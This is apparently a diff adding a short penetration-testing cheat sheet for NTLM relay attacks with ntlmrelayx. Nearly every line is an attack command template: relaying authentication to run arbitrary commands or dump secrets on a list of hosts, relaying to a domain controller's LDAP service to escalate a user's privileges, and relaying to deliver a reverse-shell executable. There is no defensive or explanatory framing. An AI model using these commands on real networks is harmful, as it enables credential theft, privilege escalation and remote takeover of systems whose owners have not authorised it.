@@ -1,0 +1,14 @@
+# Pass-The-Hash with NTHash/NTLM possible
+# Pass-The-Hash with NET-NTLM/NTLMv1/v2 not possible
+
+# relay requests to ip addresses, without -c ntlmrelayx will use secretsdump (must be in the same directory)
+python ntlmrelayx.py -tf <rhostFile> -c '<command>'
+
+# start relay using ldap (authentication needs to go over HTTP) - use ldaps for secure ldap
+python ntlmrelayx.py -t ldap://<dcIp> --escalate-user <user>
+
+# serve payload, -t = target, -e payload from file
+python ntlmrelayx.py -t <rhost> -e <./reverse.exe>
+
+# if client throws smb version-error use: -smb2support 
+
